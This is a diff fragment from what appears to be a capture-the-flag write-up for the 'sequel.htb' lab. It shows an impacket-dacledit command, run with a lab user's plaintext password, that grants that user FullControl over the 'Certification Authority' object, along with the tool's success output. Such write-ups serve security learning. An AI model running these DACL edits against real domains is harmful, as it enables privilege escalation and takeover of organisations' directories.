@@ -479,3 +479,14 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 This granted me ownership now ill give myself full control (GenericAll)
 
+```python
+impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target-dn 'CN=CERTIFICATION AUTHORITY,CN=USERS,DC=SEQUEL,DC=HTB' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3' -dc-ip 10.129.232.128
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] DACL backed up to dacledit-20260723-211020.bak
+[*] DACL modified successfully!
+```
+
+Now i should have GenericAll 
+
+So i have multiple options here, since this is a lab ill just change the user password, but generally in the real world this is bad 
